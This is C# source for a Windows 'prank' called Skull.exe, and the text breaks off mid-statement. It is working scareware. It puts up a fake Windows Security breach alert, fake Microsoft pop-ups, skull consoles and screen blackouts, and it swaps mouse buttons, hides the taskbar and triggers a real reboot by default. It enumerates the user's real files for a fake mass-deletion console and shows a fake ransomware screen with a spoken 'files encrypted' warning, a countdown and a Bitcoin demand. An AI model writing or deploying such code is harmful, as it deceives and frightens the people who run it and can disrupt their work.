// Skull.exe - prank payload (consent-only, non-destructive, no persistence)
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

static class Program
{
    // ===================== timings / tuning ================================
    const int BlackoutSeconds     = 4;
    const int QuietSeconds        = 8;
    const int BrowserDelaySec     = 45;
    const int TerminalDelaySec    = 30;
    const int GapMin              = 4;
    const int GapMax              = 12;
    const int SkullPercent        = 58;
    const int NotifPercent        = 82;
    const int IntrusiveAfterSec   = 45;
    const int FirstFinaleSec      = 90;
    const int FinaleEverySec      = 180;
    const int SilenceAfterSec     = 40;

    const string BrowserUrl = "https://www.microsoft.com/edge";

    // Restart is ON by default. Build with PRANK_SAFE to disable it.
    //   csc /define:PRANK_SAFE      mcs -define:PRANK_SAFE
#if PRANK_SAFE
    static readonly bool AllowRealReboot = false;
#else
    static readonly bool AllowRealReboot = true;
#endif

    // ===================== state ==========================================
    static readonly string TempDir  = Path.GetTempPath();
    static readonly string StopFile = Path.Combine(TempDir, "skull_prank.stop");
    static readonly string PidFile  = Path.Combine(TempDir, "skull_prank.pid");
    static readonly string SkullTxt = Path.Combine(TempDir, "skull_ascii.txt");
    static readonly string Bat1Path = Path.Combine(TempDir, "skull_1.bat");
    static readonly string Bat2Path = Path.Combine(TempDir, "skull_2.bat");
    static readonly Random Rng      = new Random();

    static DateTime StartTime;
    static bool BrowserDone, TerminalDone, MouseSwapped, TaskbarHidden;
    static DateTime BrowserAt;
    static GCHandle BeepHandle;

    static double Elapsed { get { return (DateTime.UtcNow - StartTime).TotalSeconds; } }
    static bool Alive()
    {
        if (File.Exists(StopFile)) return false;
        if (Environment.HasShutdownStarted) return false;
        return true;
    }

    // ===================== popups =========================================
    sealed class Notif
    {
        public readonly string Title, Body, Glyph, Action;
        public readonly Color Accent;
        public Notif(string title, string body, Color accent, string glyph, string action)
        { Title = title; Body = body; Accent = accent; Glyph = glyph; Action = action; }
    }

    static readonly Notif[] Notifs = {
        new Notif("Microsoft Edge", "The new Microsoft Edge is here. Faster, safer, and built for Windows.", Color.FromArgb(0,120,212), "e", "Download"),
        new Notif("Microsoft Edge", "Get 3 months of Microsoft 365 free when you set Edge as your default browser.", Color.FromArgb(0,120,212), "e", "Claim offer"),
        new Notif("Microsoft Edge", "Your browser is out of date. Switch to Microsoft Edge for the best experience.", Color.FromArgb(0,120,212), "e", "Update"),
        new Notif("Microsoft Rewards", "You earned 50 points for searching today. Claim your reward now.", Color.FromArgb(255,140,0), "R", "Claim"),
        new Notif("OneDrive", "Your storage is almost full. Upgrade to Microsoft 365 for more space.", Color.FromArgb(0,120,212), "O", "Upgrade"),
        new Notif("OneDrive", "Back up your Desktop, Documents and Pictures to OneDrive.", Color.FromArgb(0,120,212), "O", "Back up"),
        new Notif("Windows Update", "Updates are ready to install. Restart your PC to finish.", Color.FromArgb(0,90,158), "U", "Restart now"),
        new Notif("Xbox Game Pass", "Play hundreds of high-quality games from $1 for your first month.", Color.FromArgb(16,124,16), "X", "Join now"),
        new Notif("Microsoft Teams", "You have a meeting starting in 5 minutes.", Color.FromArgb(98,100,167), "T", "Join"),
        new Notif("Bing", "Search with Bing and earn Microsoft Rewards points every day.", Color.FromArgb(0,120,212), "b", "Try Bing"),
        new Notif("Microsoft 365", "Your subscription expires in 3 days. Renew now to keep your benefits.", Color.FromArgb(216,59,1), "M", "Renew"),
        new Notif("Windows Security", "Review your privacy settings and improve your protection.", Color.FromArgb(0,103,192), "S", "Review")
    };

    // ===================== win32 ==========================================
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr FindWindow(string cls, string title);
    [DllImport("user32.dll")]
    static extern bool MoveWindow(IntPtr h, int x, int y, int w, int ht, bool repaint);
    [DllImport("winmm.dll")]
    static extern bool PlaySound(IntPtr psz, IntPtr hmod, uint flags);
    [DllImport("user32.dll")]
    static extern bool SwapMouseButton(bool fSwap);
    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr extra);
    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    static extern int mciSendString(string cmd, StringBuilder ret, int len, IntPtr hwnd);

    // ===================== entry ==========================================
    [STAThread]
    static void Main()
    {
        try
        {
            StartTime = DateTime.UtcNow;
            try { if (File.Exists(StopFile)) File.Delete(StopFile); } catch { }
            File.WriteAllText(PidFile, Process.GetCurrentProcess().Id.ToString());

            Application.EnableVisualStyles();

            ShowFakeSecurity(4000);

            StartSkullConsoles();
            if (!WaitSafe(5)) return;

            ShowBlackout(BlackoutSeconds);
            if (!WaitSafe(QuietSeconds)) return;

            RunChaos();
        }
        catch { }
        finally
        {
            RestoreAll();
            try { if (BeepHandle.IsAllocated) BeepHandle.Free(); } catch { }
            try { if (File.Exists(StopFile)) File.Delete(StopFile); } catch { }
            try { if (File.Exists(PidFile))  File.Delete(PidFile);  } catch { }
            try { if (File.Exists(SkullTxt)) File.Delete(SkullTxt); } catch { }
            try { if (File.Exists(Bat1Path)) File.Delete(Bat1Path); } catch { }
            try { if (File.Exists(Bat2Path)) File.Delete(Bat2Path); } catch { }
            try { foreach (string f2 in Directory.GetFiles(TempDir, "skull_wipe_*")) File.Delete(f2); } catch { }
        }
    }

    static void RestoreAll()
    {
        try { if (MouseSwapped) { SwapMouseButton(false); MouseSwapped = false; } } catch { }
        try {
            if (TaskbarHidden) {
                IntPtr h = FindWindow("Shell_TrayWnd", null);
                if (h != IntPtr.Zero) ShowWindow(h, 5);
                TaskbarHidden = false;
            }
        } catch { }
        try { if (Control.IsKeyLocked(Keys.CapsLock)) ToggleCaps(); } catch { }
    }

    // ===================== basics =========================================
    static bool WaitSafe(double seconds)
    {
        DateTime end = DateTime.UtcNow.AddSeconds(seconds);
        while (DateTime.UtcNow < end)
        {
            if (!Alive()) return false;
            Thread.Sleep(400);
        }
        return true;
    }

    static bool SilenceWait(int seconds)
    {
        DateTime end = DateTime.UtcNow.AddSeconds(seconds);
        while (DateTime.UtcNow < end)
        {
            if (!Alive()) return false;
            Thread.Sleep(400);
        }
        return true;
    }

    static void ShowFor(Form f, int ms)
    {
        f.Show();
        f.Refresh();
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && !f.IsDisposed && Alive())
        {
            Application.DoEvents();
            Thread.Sleep(8);
        }
        if (!f.IsDisposed) f.Close();
        f.Dispose();
    }

    static GraphicsPath RoundRect(Rectangle r, int radius)
    {
        var p = new GraphicsPath();
        int d = radius * 2;
        p.AddArc(r.X, r.Y, d, d, 180, 90);
        p.AddArc(r.Right - d, r.Y, d, d, 270, 90);
        p.AddArc(r.Right - d, r.Bottom - d, d, d, 0, 90);
        p.AddArc(r.X, r.Bottom - d, d, d, 90, 90);
        p.CloseFigure();
        return p;
    }

    static Bitmap CaptureScreen()
    {
        Rectangle b = Screen.PrimaryScreen.Bounds;
        var bmp = new Bitmap(Math.Max(1, b.Width), Math.Max(1, b.Height));
        try
        {
            using (var g = Graphics.FromImage(bmp))
                g.CopyFromScreen(b.Location, Point.Empty, b.Size);
        }
        catch { }
        return bmp;
    }

    // ===================== loud beep ======================================
    static byte[] MakeBeepWav(int freq, int durationMs, double amp)
    {
        const int sr = 44100;
        int n = sr * durationMs / 1000;
        int dataBytes = n * 2;
        using (var mem = new MemoryStream(44 + dataBytes))
        using (var bw = new BinaryWriter(mem))
        {
            bw.Write(Encoding.ASCII.GetBytes("RIFF"));
            bw.Write(36 + dataBytes);
            bw.Write(Encoding.ASCII.GetBytes("WAVE"));
            bw.Write(Encoding.ASCII.GetBytes("fmt "));
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(sr);
            bw.Write(sr * 2);
            bw.Write((short)2);
            bw.Write((short)16);
            bw.Write(Encoding.ASCII.GetBytes("data"));
            bw.Write(dataBytes);
            double attack = sr * 0.004, release = sr * 0.02;
            for (int i = 0; i < n; i++)
            {
                double env = Math.Min(1.0, Math.Min(i / attack, (n - i) / release));
                bw.Write((short)(Math.Sin(2.0 * Math.PI * freq * i / sr) * 32767.0 * amp * env));
            }
            bw.Flush();
            return mem.ToArray();
        }
    }

    static void PlayRandomBeep()
    {
        try
        {
            byte[] wav = MakeBeepWav(Rng.Next(500, 2001), Rng.Next(150, 351), 0.98);
            if (BeepHandle.IsAllocated) BeepHandle.Free();
            BeepHandle = GCHandle.Alloc(wav, GCHandleType.Pinned);
            const uint ASYNC = 1, NODEFAULT = 2, MEMORY = 4;
            PlaySound(BeepHandle.AddrOfPinnedObject(), IntPtr.Zero, ASYNC | NODEFAULT | MEMORY);
        }
        catch { }
    }

    static void Ding()
    {
        try { System.Media.SystemSounds.Hand.Play(); } catch { }
    }

    // ===================== skull drawing ==================================
    static void DrawSkull(Graphics g, Rectangle r)
    {
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.Clear(Color.Black);
        float s = Math.Min(r.Width, r.Height);
        float cx = r.Width / 2f, cy = r.Height / 2f, u = s / 11f;

        using (var red = new SolidBrush(Color.FromArgb(235, 15, 15)))
        {
            float cw = 6.4f * u, ch = 5.8f * u;
            g.FillEllipse(red, cx - cw / 2f, cy - 3.9f * u, cw, ch);
            using (var jaw = new GraphicsPath())
            {
                jaw.AddPolygon(new[] {
                    new PointF(cx - 2.1f * u, cy + 1.2f * u),
                    new PointF(cx + 2.1f * u, cy + 1.2f * u),
                    new PointF(cx + 1.5f * u, cy + 3.4f * u),
                    new PointF(cx - 1.5f * u, cy + 3.4f * u)
                });
                g.FillPath(red, jaw);
            }
            float ew = 1.8f * u, eh = 2.0f * u;
            g.FillEllipse(Brushes.Black, cx - 2.2f * u - ew / 2f, cy - 2.2f * u, ew, eh);
            g.FillEllipse(Brushes.Black, cx + 2.2f * u - ew / 2f, cy - 2.2f * u, ew, eh);
            using (var nose = new GraphicsPath())
            {
                nose.AddPolygon(new[] {
                    new PointF(cx, cy - 0.2f * u),
                    new PointF(cx - 0.45f * u, cy + 0.9f * u),
                    new PointF(cx + 0.45f * u, cy + 0.9f * u)
                });
                g.FillPath(Brushes.Black, nose);
            }
            using (var pen = new Pen(Color.Black, 0.16f * u))
            {
                g.DrawLine(pen, cx - 1.9f * u, cy + 1.55f * u, cx + 1.9f * u, cy + 1.55f * u);
                for (int i = -2; i <= 2; i++)
                {
                    float x = cx + i * 0.7f * u;
                    g.DrawLine(pen, x, cy + 1.6f * u, x, cy + 3.1f * u);
                }
            }
        }
    }

    // ===================== fake security ==================================
    static Bitmap NewShield(int size)
    {
        var bmp = new Bitmap(size, size);
        using (var g = Graphics.FromImage(bmp))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.Clear(Color.White);
            float w = size, h = size;
            using (var path = new GraphicsPath())
            {
                path.AddPolygon(new[] {
                    new PointF(w*0.50f, h*0.04f), new PointF(w*0.94f, h*0.22f),
                    new PointF(w*0.94f, h*0.55f), new PointF(w*0.50f, h*0.97f),
                    new PointF(w*0.06f, h*0.55f), new PointF(w*0.06f, h*0.22f)
                });
                using (var b = new SolidBrush(Color.FromArgb(200, 25, 25))) g.FillPath(b, path);
            }
            using (var font = new Font("Segoe UI", size * 0.52f, FontStyle.Bold, GraphicsUnit.Pixel))
            using (var sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center })
                g.DrawString("!", font, Brushes.White, new RectangleF(0, h*0.10f, w, h*0.70f), sf);
        }
        return bmp;
    }

    static void ShowFakeSecurity(int holdMs)
    {
        var f = new Form {
            Text = "Windows Security", ClientSize = new Size(580, 320),
            StartPosition = FormStartPosition.CenterScreen, FormBorderStyle = FormBorderStyle.FixedDialog,
            MaximizeBox = false, MinimizeBox = false, BackColor = Color.White, TopMost = true,
            Font = new Font("Segoe UI", 9.75f)
        };
        f.Controls.Add(new PictureBox { Location = new Point(24,24), Size = new Size(56,56),
            SizeMode = PictureBoxSizeMode.Zoom, Image = NewShield(56) });
        f.Controls.Add(new Label { Text = "Security threat detected", AutoSize = true,
            Location = new Point(96,24), Font = new Font("Segoe UI", 16f, FontStyle.Bold) });
        f.Controls.Add(new Label { Text = "3 threats found", AutoSize = true, Location = new Point(99,58),
            ForeColor = Color.FromArgb(190,30,30), Font = new Font("Segoe UI", 10f, FontStyle.Bold) });
        f.Controls.Add(new Label {
            Text = "Your system is compromised.\r\n\r\nMalicious software was detected running with " +
                   "elevated privileges and is attempting to exfiltrate personal data. Real-time " +
                   "protection has been disabled.\r\n\r\nThreats: Trojan:Win32/Skull.A, " +
                   "PUA:Win32/Blackscreen, HackTool:Win32/SendKeys",
            AutoSize = false, Size = new Size(455,140), Location = new Point(99,86) });
        var clean = new Button { Text = "Clean now", Size = new Size(124,34), Location = new Point(428,258),
            BackColor = Color.FromArgb(0,103,192), ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
        clean.FlatAppearance.BorderSize = 0;
        f.Controls.Add(clean);
        f.Controls.Add(new Button { Text = "Ignore", Size = new Size(92,34), Location = new Point(328,258),
            FlatStyle = FlatStyle.Flat });
        ShowFor(f, holdMs);
    }

    // ===================== notifications ==================================
    static Bitmap NewIconTile(Color accent, string glyph, int size)
    {
        var bmp = new Bitmap(size, size);
        using (var g = Graphics.FromImage(bmp))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.Clear(Color.White);
            using (var p = RoundRect(new Rectangle(0, 0, size - 1, size - 1), size / 5))
            using (var b = new SolidBrush(accent)) g.FillPath(b, p);
            using (var font = new Font("Segoe UI", size * 0.52f, FontStyle.Bold, GraphicsUnit.Pixel))
            using (var sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center })
                g.DrawString(glyph, font, Brushes.White, new RectangleF(0, 0, size, size), sf);
        }
        return bmp;
    }

    static void ShowNotification(Notif n)
    {
        Rectangle wa = Screen.PrimaryScreen.WorkingArea;
        int w = 420, h = 164;
        int targetX = wa.Right - w - 16, y = wa.Bottom - h - 16;

        var f = new Form {
            FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Size = new Size(w, h), BackColor = Color.White, TopMost = true, ShowInTaskbar = false,
            Font = new Font("Segoe UI", 9f)
        };
        f.Paint += (s, e) => {
            using (var p = new Pen(Color.FromArgb(215,215,215))) e.Graphics.DrawRectangle(p, 0, 0, w-1, h-1);
        };
        f.Controls.Add(new PictureBox { Location = new Point(18,22), Size = new Size(46,46),
            SizeMode = PictureBoxSizeMode.Zoom, Image = NewIconTile(n.Accent, n.Glyph, 46) });
        f.Controls.Add(new Label { Text = n.Title, Location = new Point(78,16), AutoSize = true,
            Font = new Font("Segoe UI", 11f, FontStyle.Bold) });
        f.Controls.Add(new Label { Text = n.Body, Location = new Point(78,42), Size = new Size(324,66),
            ForeColor = Color.FromArgb(60,60,60) });
        var act = new Button { Text = n.Action, Location = new Point(w-18-112, h-46), Size = new Size(112,30),
            BackColor = n.Accent, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
        act.FlatAppearance.BorderSize = 0;
        f.Controls.Add(act);
        f.Controls.Add(new Button { Text = "Dismiss", Location = new Point(w-18-112-8-84, h-46),
            Size = new Size(84,30), FlatStyle = FlatStyle.Flat, ForeColor = Color.FromArgb(40,40,40) });

        f.Location = new Point(wa.Right, y);
        f.Show(); f.Refresh();
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < 260 && Alive())
        {
            double t = sw.ElapsedMilliseconds / 260.0, e = 1.0 - Math.Pow(1.0 - t, 3.0);
            f.Location = new Point((int)(wa.Right + (targetX - wa.Right) * e), y);
            Application.DoEvents(); Thread.Sleep(8);
        }
        f.Location = new Point(targetX, y);
        int holdMs = Rng.Next(3500, 6501);
        var hold = Stopwatch.StartNew();
        while (hold.ElapsedMilliseconds < holdMs && !f.IsDisposed && Alive())
        { Application.DoEvents(); Thread.Sleep(15); }
        if (!f.IsDisposed) f.Close();
        f.Dispose();
    }

    // ===================== skull consoles =================================
    static void LaunchBat(string path)
    {
        try {
            Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"" + path + "\"",
                UseShellExecute = true, WindowStyle = ProcessWindowStyle.Normal });
        } catch { }
    }

    static void MoveWindowByTitle(string title, int x, int y, int w, int h)
    {
        for (int i = 0; i < 30; i++)
        {
            IntPtr hwnd = FindWindow(null, title);
            if (hwnd != IntPtr.Zero) { MoveWindow(hwnd, x, y, w, h, true); return; }
            Thread.Sleep(120);
        }
    }

    static void StartSkullConsoles()
    {
        string ascii =
@"       .------------.
     .'              '.
    /  .-.        .-.  \
   |  (   )      (   )  |
   |   `-'        `-'   |
    \         /\        /
     '.      /  \     .'
       '-._ /    \ _.-'
           |      |
          /|      |\
         / |      | \
        /__|______|__\
";
        ascii = ascii.Replace("\r\n", "\n").Replace("\n", "\r\n");
        File.WriteAllText(SkullTxt, ascii, Encoding.ASCII);

        string body = "@echo off\r\nmode con cols=46 lines=20 >nul\r\ncolor 0C\r\ntitle {0}\r\ntype \"{1}\"\r\ntimeout /t 6 /nobreak >nul\r\n";
        File.WriteAllText(Bat1Path, string.Format(body, "SYSTEM BREACH // 01", SkullTxt), Encoding.ASCII);
        File.WriteAllText(Bat2Path, string.Format(body, "SYSTEM BREACH // 02", SkullTxt), Encoding.ASCII);

        LaunchBat(Bat1Path);
        LaunchBat(Bat2Path);

        Thread.Sleep(500);
        Rectangle vs = SystemInformation.VirtualScreen;
        MoveWindowByTitle("SYSTEM BREACH // 01", vs.Left + 60,  vs.Top + 60, 430, 380);
        MoveWindowByTitle("SYSTEM BREACH // 02", vs.Left + 520, vs.Top + 60, 430, 380);
    }

    // ===================== simple overlays ================================
    static void ShowBlackout(int seconds)
    {
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = SystemInformation.VirtualScreen, BackColor = Color.Black, TopMost = true, ShowInTaskbar = false };
        ShowFor(f, seconds * 1000);
    }

    static void ShowFlicker(int ms)
    {
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = SystemInformation.VirtualScreen, BackColor = Color.Black, TopMost = true, ShowInTaskbar = false };
        f.Paint += (s, e) => DrawSkull(e.Graphics, f.ClientRectangle);
        ShowFor(f, ms);
    }

    // ===================== FINALE: frozen desktop =========================
    static void FrozenScreen(int ms)
    {
        Bitmap shot = CaptureScreen();
        Rectangle b = Screen.PrimaryScreen.Bounds;
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = b, TopMost = true, ShowInTaskbar = false, BackgroundImage = shot,
            BackgroundImageLayout = ImageLayout.None };
        f.Show(); f.Refresh();
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive()) { Application.DoEvents(); Thread.Sleep(15); }
        f.Close(); f.Dispose(); shot.Dispose();
    }

    // ===================== FINALE: glitch ================================
    static void Glitch(int ms)
    {
        Bitmap shot = CaptureScreen();
        Rectangle b = Screen.PrimaryScreen.Bounds;
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = b, BackColor = Color.Black, TopMost = true, ShowInTaskbar = false };
        f.Paint += (s, e) => {
            var g = e.Graphics;
            g.Clear(Color.Black);
            int slices = 10, sh = Math.Max(1, b.Height / slices);
            for (int i = 0; i < slices; i++)
            {
                int off = Rng.Next(-90, 91);
                var src = new Rectangle(0, i * sh, b.Width, Math.Min(sh, b.Height - i * sh));
                var dst = new Rectangle(off, i * sh, b.Width, Math.Min(sh, b.Height - i * sh));
                try { g.DrawImage(shot, dst, src, GraphicsUnit.Pixel); } catch { }
            }
            for (int i = 0; i < 5; i++)
            {
                int y = Rng.Next(0, b.Height), hh = Rng.Next(2, 24), off = Rng.Next(-30, 31);
                var src = new Rectangle(0, y, b.Width, Math.Min(hh, b.Height - y));
                var dst = new Rectangle(off, y, b.Width, Math.Min(hh, b.Height - y));
                try { g.DrawImage(shot, dst, src, GraphicsUnit.Pixel); } catch { }
            }
            for (int i = 0; i < 25; i++)
            {
                int x = Rng.Next(0, b.Width), y = Rng.Next(0, b.Height);
                int ww = Rng.Next(2, 40), hh = Rng.Next(2, 14);
                using (var br = new SolidBrush(Color.FromArgb(Rng.Next(0, 256), Rng.Next(0, 256), Rng.Next(0, 256))))
                    g.FillRectangle(br, x, y, ww, hh);
            }
            if (Rng.Next(0, 3) == 0)
            {
                int y = Rng.Next(0, b.Height);
                using (var br = new SolidBrush(Rng.Next(0, 2) == 0 ? Color.Black : Color.White))
                    g.FillRectangle(br, 0, y, b.Width, Rng.Next(1, 6));
            }
        };
        f.Show(); f.Refresh();
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive())
        { f.Invalidate(); Application.DoEvents(); Thread.Sleep(35); }
        f.Close(); f.Dispose(); shot.Dispose();
    }

    // ===================== FINALE: file enumeration =======================
    static List<string> CollectFiles(int max)
    {
        var list = new List<string>();
        try
        {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] roots = { "Desktop", "Documents", "Downloads", "Pictures", "Videos" };
            foreach (string r in roots)
            {
                Walk(Path.Combine(home, r), list, max, 0);
                if (list.Count >= max) break;
            }
        }
        catch { }

        if (list.Count == 0)
        {
            list.Add(@"C:\Users\Public\Documents\Q3_report_final.docx");
            list.Add(@"C:\Users\Public\Pictures\holiday_2025.jpg");
            list.Add(@"C:\Users\Public\Documents\passwords.txt");
            list.Add(@"C:\Users\Public\Documents\invoice_00871.pdf");
            list.Add(@"C:\Users\Public\Videos\family.mp4");
        }
        return list;
    }

    static void Walk(string dir, List<string> outp, int max, int depth)
    {
        if (depth > 6 || outp.Count >= max) return;
        try { foreach (string f in Directory.GetFiles(dir)) { outp.Add(f); if (outp.Count >= max) return; } }
        catch { }
        try { foreach (string d in Directory.GetDirectories(dir)) { Walk(d, outp, max, depth + 1); if (outp.Count >= max) return; } }
        catch { }
    }

    // ===================== FINALE: real-console deletion ==================
    static void FakeDeletion(List<string> files, int ms)
    {
        var chunks = new List<string>();
        string batPath = Path.Combine(TempDir, "skull_wipe.bat");
        try
        {
            var lines = new List<string>();
            lines.Add("Microsoft Windows [Version 10.0.22631.3155]");
            lines.Add("(c) Microsoft Corporation. All rights reserved.");
            lines.Add("");
            lines.Add("C:\\Windows\\system32>whoami");
            lines.Add(Environment.MachineName.ToLowerInvariant() + "\\" + Environment.UserName.ToLowerInvariant());
            lines.Add("");
            lines.Add("C:\\Windows\\system32>del /f /s /q C:\\Users\\" + Environment.UserName + "\\*.*");
            lines.Add("");
            foreach (string f in files)
            {
                if (Rng.Next(0, 12) == 0) lines.Add("Access is denied.");
                lines.Add("Deleted file - " + f);
            }
            lines.Add("");
            lines.Add("C:\\Windows\\system32>dir C:\\Users\\" + Environment.UserName + "\\Desktop");
            lines.Add(" Volume in drive C is Windows");
            lines.Add(" Volume Serial Number is 8A3C-19F2");
            lines.Add("");
            lines.Add(" Directory of C:\\Users\\" + Environment.UserName + "\\Desktop");
            lines.Add("");
            lines.Add("File Not Found");
            lines.Add("");
            lines.Add("C:\\Windows\\system32>");

            int per = 10, n = 0;
            for (int i = 0; i < lines.Count; i += per)
            {
                var sb = new StringBuilder();
                for (int j = i; j < Math.Min(i + per, lines.Count); j++) sb.AppendLine(lines[j]);
                string p = Path.Combine(TempDir, "skull_wipe_" + n + ".txt");
                File.WriteAllText(p, sb.ToString(), Encoding.ASCII);
                chunks.Add(p);
                n++;
            }

            var bat = new StringBuilder();
            bat.AppendLine("@echo off");
            bat.AppendLine("mode con cols=110 lines=38 >nul");
            bat.AppendLine("color 07");
            bat.AppendLine("title Administrator: C:\\Windows\\system32\\cmd.exe");
            foreach (string p in chunks)
            {
                bat.AppendLine("type \"" + p + "\"");
                bat.AppendLine("ping -n 2 127.0.0.1 >nul");
            }
            File.WriteAllText(batPath, bat.ToString(), Encoding.ASCII);

            Process p2 = Process.Start(new ProcessStartInfo {
                FileName = "cmd.exe",
                Arguments = "/c \"" + batPath + "\"",
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Normal
            });

            Thread.Sleep(400);
            Rectangle vs = SystemInformation.VirtualScreen;
            int cw = 900, ch = 560;
            MoveWindowByTitle("Administrator: C:\\Windows\\system32\\cmd.exe",
                vs.Left + (vs.Width - cw) / 2, vs.Top + (vs.Height - ch) / 2, cw, ch);

            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < ms && Alive())
            {
                if (p2 != null && p2.HasExited) break;
                Thread.Sleep(100);
            }
            try { if (p2 != null && !p2.HasExited) p2.Kill(); } catch { }
        }
        catch { }
        finally
        {
            foreach (string p in chunks) { try { File.Delete(p); } catch { } }
            try { File.Delete(batPath); } catch { }
        }
    }

    // ===================== TTS ============================================
    static void Speak(string text)
    {
        try
        {
            var th = new Thread(() => {
                try
                {
                    Type t = Type.GetTypeFromProgID("SAPI.SpVoice");
                    if (t == null) return;
                    object voice = Activator.CreateInstance(t);
                    t.InvokeMember("Speak", System.Reflection.BindingFlags.InvokeMethod,
                                   null, voice, new object[] { text });
                }
                catch { }
            });
            th.IsBackground = true;
            th.Start();
        }
        catch { }
    }

    static void SpeakLine()
    {
        string[] lines = {
            "I can see your desktop.",
            "Deleting personal files.",
            "Your files are being encrypted.",
            "Do not turn off your computer."
        };
        Speak(lines[Rng.Next(lines.Length)]);
    }

    // ===================== FINALE: ransomware =============================
    static void FakeRansomware(List<string> files, int ms)
    {
        Rectangle b = Screen.PrimaryScreen.Bounds;
        int w = b.Width, h = b.Height;
        Bitmap proof = CaptureScreen();

        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = b, BackColor = Color.Black, TopMost = true, ShowInTaskbar = false };

        f.Controls.Add(new Label {
            Text = "YOUR FILES HAVE BEEN ENCRYPTED", AutoSize = false,
            Location = new Point(0, (int)(h * 0.03)), Size = new Size(w, (int)(h * 0.07)),
            TextAlign = ContentAlignment.MiddleCenter, ForeColor = Color.FromArgb(230, 20, 20),
            Font = new Font("Segoe UI", Math.Max(18f, h / 22f), FontStyle.Bold) });

        f.Controls.Add(new Label {
            Text = "All of your documents, photos, videos and databases have been encrypted with AES-256 " +
                   "and a unique RSA-4096 key. The only way to recover them is to obtain the private key. " +
                   "Do not rename, move or modify the encrypted files - they will be permanently corrupted. " +
                   "Do not attempt to restore from backup: your backups have already been deleted. " +
                   "You have 72 hours before the key is destroyed.",
            AutoSize = false, Location = new Point((int)(w * 0.05), (int)(h * 0.105)),
            Size = new Size((int)(w * 0.90), (int)(h * 0.10)),
            TextAlign = ContentAlignment.MiddleCenter, ForeColor = Color.FromArgb(205, 205, 205),
            Font = new Font("Segoe UI", Math.Max(9f, h / 64f)) });

        var lb = new ListBox {
            Location = new Point((int)(w * 0.04), (int)(h * 0.23)),
            Size = new Size((int)(w * 0.44), (int)(h * 0.47)), BackColor = Color.Black,
            ForeColor = Color.FromArgb(255, 70, 70), BorderStyle = BorderStyle.None,
            Font = new Font("Consolas", Math.Max(8f, h / 92f)), IntegralHeight = false,
            SelectionMode = SelectionMode.None, HorizontalScrollbar = false };
        f.Controls.Add(lb);

        f.Controls.Add(new Label { Text = "WHAT HAPPENED TO MY FILES?", AutoSize = false,
            Location = new Point((int)(w * 0.04), (int)(h * 0.72)),
            Size = new Size((int)(w * 0.44), (int)(h * 0.032)),
            ForeColor = Color.FromArgb(230, 60, 60),
            Font = new Font("Segoe UI", Math.Max(9f, h / 70f), FontStyle.Bold) });

        f.Controls.Add(new Label {
            Text = "A remote operator encrypted every file on this device. A copy of the private key " +
                   "is stored on our server. After payment you will receive a decryption tool and full " +
                   "instructions. Do not shut down or restart this computer - the key is tied to this session.",
            AutoSize = false, Location = new Point((int)(w * 0.04), (int)(h * 0.755)),
            Size = new Size((int)(w * 0.44), (int)(h * 0.10)),
            ForeColor = Color.FromArgb(170, 170, 170),
            Font = new Font("Segoe UI", Math.Max(8f, h / 86f)) });

        var pic = new PictureBox {
            Location = new Point((int)(w * 0.52), (int)(h * 0.23)),
            Size = new Size((int)(w * 0.42), (int)(h * 0.26)),
            SizeMode = PictureBoxSizeMode.Zoom, Image = proof, BorderStyle = BorderStyle.FixedSingle };
        f.Controls.Add(pic);

        f.Controls.Add(new Label { Text = "PROOF OF COMPROMISE", AutoSize = false,
            Location = new Point((int)(w * 0.52), (int)(h * 0.495)),
            Size = new Size((int)(w * 0.42), 24),
            ForeColor = Color.FromArgb(255, 70, 70), Font = new Font("Segoe UI", 9f, FontStyle.Bold) });

        var cd = new Label { AutoSize = false,
            Location = new Point((int)(w * 0.52), (int)(h * 0.54)),
            Size = new Size((int)(w * 0.42), (int)(h * 0.05)), ForeColor = Color.White,
            Font = new Font("Consolas", Math.Max(12f, h / 36f), FontStyle.Bold) };
        f.Controls.Add(cd);

        var cnt = new Label { AutoSize = false,
            Location = new Point((int)(w * 0.52), (int)(h * 0.595)),
            Size = new Size((int)(w * 0.42), (int)(h * 0.04)),
            ForeColor = Color.FromArgb(255, 120, 120),
            Font = new Font("Consolas", Math.Max(9f, h / 62f)) };
        cnt.Text = string.Format("Files encrypted: 0 / {0}", files.Count);
        f.Controls.Add(cnt);

        f.Controls.Add(new Label { Text = "Send 0.05 BTC to:  bc1q7x4p9skullprank0deadbeef3f8a2c6d1",
            AutoSize = false, Location = new Point((int)(w * 0.52), (int)(h * 0.65)),
